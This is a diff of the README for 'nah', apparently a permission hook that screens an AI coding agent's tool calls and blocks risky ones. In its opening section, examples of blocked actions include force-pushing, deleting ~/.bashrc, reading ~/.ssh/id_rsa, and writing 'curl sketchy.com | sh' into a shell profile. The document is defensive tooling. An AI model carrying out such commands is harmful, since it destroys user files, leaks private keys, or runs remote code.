@@ -20,17 +20,17 @@
 
 ## The problem
 
-`git push`? Sure.<br>
-`git push --force`? nah?
+`git push` — Sure.<br>
+`git push --force` — **nah?**
 
-`rm -rf __pycache__` to clean up? Ok, cleaning up.<br>
-`rm ~/.bashrc`? nah.
+`rm -rf __pycache__` — Ok, cleaning up.<br>
+`rm ~/.bashrc` — **nah.**
 
-Read `./src/app.py`? Go ahead.<br>
-Read `~/.ssh/id_rsa`? nah.
+**Read** `./src/app.py` — Go ahead.<br>
+**Read** `~/.ssh/id_rsa` — **nah.**
 
-Write `./config.yaml`? Fine.<br>
-Write `~/.bashrc` with `curl sketchy.com | sh`? nah.
+**Write** `./config.yaml` — Fine.<br>
+**Write** `~/.bashrc` with `curl sketchy.com | sh` — **nah.**
 
 `nah` classifies every tool call by what it actually does using contextual rules that run in milliseconds. For the ambiguous stuff, optionally route to an LLM. Every decision is logged and inspectable. Works out of the box, configure it how you want it.
 
@@ -43,8 +43,12 @@ nah install
 
 You are up and running. To uninstall: `nah uninstall && pip uninstall nah`.
 
-> **Don't use `--dangerously-skip-permissions`.**
-> In bypass mode, hooks [fire asynchronously](https://github.com/anthropics/claude-code/issues/20946) — commands execute before nah can block them. Use Claude Code's permission system (`acceptEdits` or default mode) as the first layer and nah as defense-in-depth on top. They're complementary, not substitutes.
+> **Don't use `--dangerously-skip-permissions`.** In bypass mode, hooks
+> [fire asynchronously](https://github.com/anthropics/claude-code/issues/20946) —
+> commands execute before nah can block them.
+>
+> Allow-list `Bash`, `Read`, `Glob`, `Grep` and let nah guard them.
+> For `Write` and `Edit`, your call — nah inspects content either way.
 
 ## What it guards
 
@@ -54,8 +58,8 @@ nah is a [PreToolUse hook](https://docs.anthropic.com/en/docs/claude-code/hooks)
 |------|----------------|
 | **Bash** | Structural command classification — action type, pipe composition, shell unwrapping |
 | **Read** | Sensitive path detection (`~/.ssh`, `~/.aws`, `.env`, ...) |
-| **Write** | Path check + content inspection (secrets, exfiltration, destructive payloads) |
-| **Edit** | Path check + content inspection on the replacement string |
+| **Write** | Path check + project boundary + content inspection (secrets, exfiltration, destructive payloads) |
+| **Edit** | Path check + project boundary + content inspection on the replacement string |
 | **Glob** | Guards directory scanning of sensitive locations |
 | **Grep** | Catches credential search patterns outside the project |
 | **MCP tools** | Generic classification for third-party tool servers (`mcp__*`) |
@@ -101,7 +105,7 @@ Tool call → nah (deterministic) → LLM (optional) → Claude Code permissions
 
 The deterministic layer always runs first — the LLM only resolves leftover "ask" decisions. If no LLM is configured or available, the decision stays "ask" and the user is prompted.
 
-Supported providers: Ollama, OpenRouter, OpenAI, Anthropic, Snowflake.
+Supported providers: Ollama, OpenRouter, OpenAI, Anthropic, Snowflake Cortex.
 
 ## Configure
 
